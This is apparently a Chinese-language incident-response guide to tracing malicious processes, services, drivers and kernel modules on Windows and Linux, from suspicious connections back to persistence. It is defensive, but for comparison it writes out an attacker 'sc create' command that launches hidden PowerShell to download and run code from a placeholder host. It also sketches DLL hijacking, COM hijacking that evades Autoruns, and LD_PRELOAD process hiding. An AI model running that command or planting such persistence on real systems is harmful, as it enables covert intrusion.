# 进程 / 服务 / 驱动 / 模块排查

**核心路径**：异常网络连接 → 定位 PID → `/proc/PID` 反查可执行文件 → 判定恶意 → 找它的持久化机制。

> ⚠️ **挖矿木马常已自删除二进制**：进程还在跑，但文件没了。此时只能靠 `/proc/PID/exe` 捞，或从定时任务/服务反查。**杀进程前先保留证据**。

---

## 一、Windows

### 进程排查

```cmd
tasklist                        :: 基础进程列表
tasklist /svc                   :: 进程 → PID → 对应服务
tasklist | findstr "<PID>"      :: 按 PID 定位
tasklist /v                     :: 含用户名、窗口标题

wmic process get name,processid,executablepath,commandline
wmic process where "processid=<PID>" get commandline,executablepath
```

```powershell
Get-Process | Select-Object Name,Id,Path,Company,StartTime
Get-CimInstance Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine
Get-Process | Where-Object { -not $_.Company }      # 无厂商信息的进程
```

**图形界面**：

- 任务管理器 → 查看 → 选择列 → 勾 PID / **命令行** / 映像路径
- `msinfo32` → 软件环境 → 正在运行任务（含**路径、PID**）

**⭐ 判据：什么样的进程可疑**

| 特征 | 说明 |
|---|---|
| **无数字签名验证信息** | 最有效的一条 |
| **无描述信息** | |
| **进程属主异常** | 如 Web 服务进程以 SYSTEM 跑 |
| **路径不合法** | 不在 `System32`/`Syswow64` 却在临时目录 |
| **CPU / 内存长期高占用** | 挖矿信号 |
| **仿冒系统进程名** | 真实案例：`schost.exe` 仿冒 `svchost.exe` |

**2026 现实的坑**：`systeminfo` / `wmic` 在部分新系统上被弃用或移除，`tasklist` 仍在。缺 `wmic` 时用 PowerShell 等价查询。

### 网络连接

```cmd
netstat -ano                      :: ⭐ 全部连接 + PID
netstat -ano | findstr "LISTENING"
netstat -ano | findstr "<PID>"
netstat -ano | findstr "445"      :: 挖矿蠕虫常对内网发大量 445（永恒之蓝）
netstat -anob                     :: 含进程名（需管理员）
```

**判据**：**ESTABLISHED 且外部地址不在已知范围内** ⇒ 可疑连接。

真实案例：服务器只允许对指定 IP 建立连接，发现范围外的连接即为异常。

**工具**：

- **TCPView**（Sysinternals）—— 进程 ↔ 连接实时视图。**绿色 = 新发起，红色 = 已结束**
- `bin/SysinternalsSuite/Tcpview64.exe`

### 服务排查

```cmd
services.msc                      :: 图形界面
sc query type= service state= all :: 列出所有服务
sc qc <服务名>                     :: ⭐ 看服务的 binPath（可执行路径）
sc queryex <服务名>                :: 含 PID
```

```powershell
Get-CimInstance Win32_Service | Select-Object Name,DisplayName,State,StartMode,PathName
Get-CimInstance Win32_Service | Where-Object { $_.PathName -match 'temp|Users|ProgramData' }
```

`msinfo32` → 软件环境 → 服务（含**名称、状态、路径**）。

**判据**：

- **服务缺少描述内容**且**非系统常见服务** ⇒ 可疑
- **binPath 通过 `cmd` / `powershell` 启动**或指向临时目录 ⇒ 高度可疑

真实案例：名为 `dBFh` 的服务缺少描述、非常见服务，属性显示它**通过 `cmd` 执行 `installed.exe`** → 定位到 C 盘下的 `installed.exe` 恶意样本。

**攻击者建服务的手法**（对照判读）：

```cmd
sc create "KeyName" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX (...downloadstring('http://x.x.x.x/logo.gif'))\""
sc description KeyName "Just For Test"
sc config KeyName start= auto
net start KeyName
```

### 驱动 / 模块

```cmd
driverquery                      :: 已加载驱动
:: msinfo32 → 系统驱动程序（含名称、描述、文件）
:: msinfo32 → 加载的模块（含名称、路径）  ← 找被注入的 DLL
```

```
:: 攻击者 DLL 劫持手法（LPK.dll 为例）
:: Win7+ 有 KnownDLLs 保护，需先添加到排除列表：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
:: 添加 "lpk.dll" 后，把恶意 lpk.dll 放到进程搜索路径优先级更高的目录
```

### COM 劫持

修改 CLSID 下的注册表键值，劫持 `CAccPropServicesClass` 和 `MMDeviceEnumerator`——**系统很多正常程序启动时会调用这两个实例**。

> ⚠️ **这种方法可以绕过 Autoruns 的启动项检测**。Autoruns 干净不代表没有持久化。

### PCHunter 条目颜色（考点）

| 颜色 | 含义 |
|---|---|
| 黑 | 微软进程 |
| 蓝 | 非微软进程，可能是第三方程序；**蓝色且缺少文件厂商信息需多加关注** |
| 红 | ⭐ **可疑进程、隐藏服务、被挂钩函数** |

---

## 二、Linux

### 进程排查

```bash
ps aux                    # ⭐ USER / PID / TIME / COMMAND
ps -ef                    # 含 PPID（看父进程，判断是谁拉起来的）
ps aux --sort=-%cpu | head        # CPU 排行（挖矿）
ps aux --sort=-%mem | head        # 内存排行
top -c                    # 实时，`c` 显示完整命令行
```

**判据**：

- **CPU / 内存占用异常高** ⇒ 优先排查
- **随机字符串命名的进程**（真实案例：`MLEFDb`）⇒ 挖矿木马典型
- **父进程是 Web 服务**（如 `apache`/`nginx`/`java` 拉起了 `sh`/`bash`/`python`）⇒ Webshell 执行命令
- **命令行含 base64 / curl / wget / nc** ⇒ 下载执行或反弹 shell

### ⭐ 从 PID 反查可执行文件（最常用的一步）

```bash
ls -alh /proc/<PID>              # 看 exe、cwd、fd
ls -l /proc/<PID>/exe            # 可执行文件真实路径（含 (deleted) 标记）
readlink -f /proc/<PID>/exe
ls -l /proc/<PID>/cwd            # 工作目录
ls -l /proc/<PID>/fd             # 打开的文件（可能含已删除的）
cat /proc/<PID>/cmdline | tr '\0' ' '   # 完整命令行
cat /proc/<PID>/environ | tr '\0' '\n'  # 环境变量（可能含凭据）
cat /proc/<PID>/maps             # 内存映射（看加载的 .so / JAR）

lsof -p <PID>                    # 该进程打开的所有文件
lsof -i:<port>                   # ⭐ 指定端口对应的进程
fuser -n tcp <port>
```

**`(deleted)` 标记** = 文件已被删除但进程仍持有句柄 ⇒ **挖矿/木马自删除的典型形态**。

```bash
# 从内存恢复已删除的可执行文件（真实案例：进程文件已删，复制内存副本识别出远控工具）
cp /proc/<PID>/exe /tmp/recovered_bin
strings /tmp/recovered_bin | head -50
```

### 隐藏进程

**攻击者手法**：`LD_PRELOAD` 劫持系统调用，把恶意 `.so` 写入 `/etc/ld.so.preload`，使 `ps`/`top` 都看不到目标进程。

```bash
# ① 检查 LD_PRELOAD 劫持
cat /etc/ld.so.preload
ls -la /etc/ld.so.preload
env | grep LD_PRELOAD

# ② ⭐ 用 unhide 检出
yum -y install epel-release && yum -y install unhide
unhide proc
unhide sys                      # 对比系统调用
unhide checkopts

# ③ 手工对比 /proc 与 ps（不需要装工具）
ls -d /proc/[0-9]* | wc -l      # /proc 下的进程数
ps -e --no-headers | wc -l      # ps 看到的进程数
# 数量不一致 ⇒ 有隐藏进程。再用 comm 命令找差集
```

真实案例：`ps` 和 `top` 都看不到恶意进程，`unhide proc` 查了出来。

### 进程安全检测

```bash
# ⭐ 遍历所有进程的 TracerPid，发现被调试的进程
grep TracerPid /proc/*/status | grep -v 'TracerPid:\s*0'

# Raw Socket / Packet Socket 进程（可能是抓包或后门）
cat /proc/net/raw
cat /proc/net/packet

# memfd_create 无文件执行（恶意程序不落盘）
ls -l /proc/*/exe 2>/dev/null | grep memfd
grep -l memfd /proc/*/maps 2>/dev/null
```

### 服务排查

```bash
systemctl list-units --type=service --state=running
systemctl list-unit-files --type=service --state=enabled
systemctl cat <service>                  # ⭐ 完整 unit 定义
service --status-all
chkconfig --list                         # SysV 风格
```

**判据**：`ExecStart` 指向 `/tmp`、`/dev/shm`、`/var/tmp` ⇒ 高度可疑。

### 内核模块与 Rootkit

```bash
lsmod                                    # 已加载模块
cat /proc/modules                        # ⭐ 与 lsmod 交叉对比查隐藏模块
diff <(lsmod | awk '{print $1}' | sort) <(cat /proc/modules | awk '{print $1}' | sort)

modinfo <module>                         # 模块信息
# 未签名模块需重点关注
```

```bash
# Rootkit 字符串探测（已知家族）
grep -rE 'hidepid|diamorphine|adore|kbeast|suterusu' /lib/modules/ 2>/dev/null

# Capabilities 审计（cap_sys_admin / cap_sys_ptrace / cap_net_raw 等危险能力）
getcap -r / 2>/dev/null

# 内核启动参数与 LSM 状态
cat /proc/cmdline
cat /sys/kernel/security/lsm

# core_pattern（可能被改来劫持崩溃转储）
cat /proc/sys/kernel/core_pattern
```

### 版本对照：CentOS 7 之前的服务管理

```bash
chkconfig --list
service <name> status
# 启动脚本在 /etc/init.d/
```

---

## 三、⭐ 从异常连接倒推完整攻击链（实战路径）

真实案例的完整链条，可以直接照做：

```
① netstat -anp / ss -antp
   发现异常 ESTABLISHED 连接（或连接到未知外部 IP）

② 记下 PID，反查可执行文件
   ls -l /proc/<PID>/exe
   → 发现文件已删除（挖矿/木马自删除）

③ 复制内存副本识别
   cp /proc/<PID>/exe /tmp/rec && strings /tmp/rec | head
   → 识别出 Termite(白蚁) / 挖矿母体 / 等

④ 进程由谁拉起（父进程）
   ps -o ppid= -p <PID>          → 拿到 PPID
   ps -p <PPID> -o cmd=
   → 发现是 cron / systemd / 某个被替换的服务

⑤ 找持久化
   crontab -l ; ls -la /etc/cron* ; ls -la /etc/systemd/system/
   → 找到定时任务（如每 23 分钟执行的 .aliyun.sh）

⑥ 解码混淆内容
   cat .aliyun.sh                → base64
   base64 -d .aliyun.sh          → 真实下载地址与逻辑

⑦ 溯源上游
   grep "<恶意IP/域名>" /var/log/secure /var/log/messages
```

---

## 四、常见问法与答法

| 问 | 答什么 |
|---|---|
| 恶意进程名 / PID | `ps aux` 输出 + 文件名 |
| 进程的可执行文件路径 | `/proc/<PID>/exe` 输出（**注意 `(deleted)`**） |
| 连接到哪个 IP/端口 | `netstat -anp` / `ss -antp` / `lsof -i:<port>` |
| 进程怎么启动的 | 父进程（`ps -o ppid=`）或 cron/systemd/service |
| 有没有隐藏进程 | `unhide proc` 输出 / `/proc` 与 `ps` 计数对比 |
| 服务是否被改 | `sc qc` / `systemctl cat` 的 binPath/ExecStart |
| 有没有被调试 | `TracerPid != 0` 的进程 |

---

## 相关文档

- `30-file-artifacts.md` — 从进程路径继续查文件与完整性
- `40-log-analysis.md` — 进程创建时间对应的日志
- `50-memory-traffic.md` — 内存取证查隐藏进程与注入
- `events/cryptomining.md` — 挖矿进程/自删除/定时任务完整实例
